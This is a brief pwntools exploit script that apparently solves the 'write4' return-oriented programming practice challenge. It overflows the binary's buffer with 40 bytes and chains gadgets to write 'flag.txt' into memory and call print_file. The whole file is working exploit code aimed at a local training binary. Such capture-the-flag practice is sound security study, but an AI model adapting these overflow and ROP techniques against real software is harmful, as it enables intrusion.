from pwn import *

elf = ELF("./write4")

p = process("./write4")
p.recvuntil('> ')

pop_rdi = p64(0x0000000000400693)
mov_r14_r15 = p64(0x0000000000400628)
pop_r14_r15 = p64(0x0000000000400690)
writable_area = p64(0x0000000000601028)

payload = b''
payload += pop_r14_r15 + writable_area + b'flag.txt' + mov_r14_r15 + pop_rdi + writable_area
payload += p64(elf.symbols['print_file'])

p.send(cyclic(40) + payload)
					   

p.interactive()
